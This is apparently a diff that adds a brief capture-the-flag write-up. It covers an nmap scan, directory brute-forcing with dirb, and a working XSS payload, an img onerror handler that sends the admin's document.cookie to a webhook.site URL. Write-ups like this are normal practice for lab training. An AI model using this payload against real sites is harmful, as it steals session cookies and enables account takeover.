@@ -1,0 +1,11 @@
+1) connecting to the IP via browser amounted to nothing, so i did an nmap scan on it, nmap IP 
+2) port 3000 was open, after research i found this can be used as a http port, so i used my browser to navigate to IP:3000, bingo
+(after doing this i realised it tells us to use port 3000 in the challenge description, always read the brief!)
+3) dirb the site, which tells you about the /admin page
+4) one of the workers mentions that the admin looks at this page, so we need to send their cookie to us through an xss attack
+
+replace the webhook.site link with your own instance of webhook, and put the following into the input field
+<img src="/" onerror="var xhttp = new XMLHttpRequest(); xhttp.open('GET', 'https://webhook.site/a72d4900-1f3b-40e2-b2a1-029d3e649068?cookie=' + document.cookie, false);xhttp.send();">
+wait 2 minuites and look on webhook, you will see the admin's cookie
+(make sure you have made an account first and are logged in)
+
